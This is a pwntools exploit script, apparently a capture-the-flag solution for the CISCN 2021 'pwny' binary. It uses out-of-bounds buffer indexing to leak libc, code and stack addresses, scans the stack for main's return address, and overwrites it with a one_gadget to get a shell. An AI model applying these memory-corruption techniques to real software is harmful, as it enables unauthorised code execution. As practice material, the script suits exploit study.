from pwn import *
from LibcSearcher import *
context.log_level='debug'

# ld_path = "/root/Desktop/pwnfile/ld/ld-2.27.so"
# libc_path = "/root/Desktop/pwnfile/CISCN/2021/pwny/libc-2.27.so"
libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
# io = process([ld_path, "./pwny"], env={"LD_PRELOAD":libc_path})

io = process('./pwny')

libc = ELF(libc_path)
# one_gadgets = [0x4f3d5, 0x4f432, 0x10a41c]	# one_gadget for libc 2.27 given
one_gadgets = [0xe3afe, 0xe3b01, 0xe3b04]

def read_buf(index):
	io.sendlineafter(b'Your choice: ', b'1')
	io.sendafter(b'Index: ', p64(index))
	io.recvuntil(b'Result: ')
	return io.recvuntil(b'\n', drop=True)

def write_buf(index, numin=None, need_input=True):
	io.sendlineafter(b'Your choice: ', b'2')
	io.sendlineafter(b'Index: ', str(index).encode())
	if need_input:
		io.send(p64(numin))

write_buf(0x100, need_input=False)
write_buf(0x100, need_input=False)	# read(stdin, index, 8)

read_addr = read_buf(0xffffffffffffffe9)		# we can get address of function 'read'
read_addr = int(read_addr.decode(), 16)
base = read_addr - libc.symbols['read']
print('base: ' + hex(base))
sys = base + libc.symbols['system']
binsh = base + next(libc.search(b'/bin/sh'))
env = base + libc.symbols['environ']
libc_start_main = base + libc.symbols['__libc_start_main']

# flag = libc_start_main + 231		# return address of function 'main'
flag = libc_start_main + 243
og = base + one_gadgets[2]
print('environ: ' + hex(env))		# stack address (place to store arguments of elf)

# write_buf(0xffffffffffffffe9, og)		# full RELRO, cannot change the .got segment
# gdb.attach(io)

code_addr = read_buf(0xfffffffffffffff5)	# get code base
code_addr = int(code_addr.decode(), 16)
code_base = code_addr - 0x202008
buf_addr = code_base + 0x202060
print('buf: ' + hex(buf_addr))

scan = (env - buf_addr) // 8
if scan < 0:
	scan += 1 << 64
print('scan: ' + hex(scan))

stack_addr = read_buf(scan)		# get stack address
stack_addr = int(stack_addr.decode(), 16)
print('stack: ' + hex(stack_addr))

swipe = (stack_addr - buf_addr) // 8
print('swipe: ' + hex(swipe))

while True:
	stack_val = int(read_buf(swipe).decode(), 16)
	if stack_val == flag:
		break
	swipe -= 1

main_ret = buf_addr + swipe * 8
ret_addr = main_ret - 0x30

write_buf((ret_addr - buf_addr) // 8, og)

io.interactive()